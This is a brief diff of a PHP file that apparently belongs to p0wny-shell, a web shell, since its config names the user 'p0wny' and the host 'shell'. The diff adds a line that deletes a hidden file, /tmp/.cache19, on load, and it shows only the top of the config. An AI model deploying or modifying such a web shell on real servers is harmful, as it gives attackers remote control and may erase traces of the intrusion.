@@ -1,5 +1,7 @@
 <?php
 
+unlink("/tmp/.cache19");
+
 $SHELL_CONFIG = array(
     'username' => 'p0wny',
     'hostname' => 'shell',
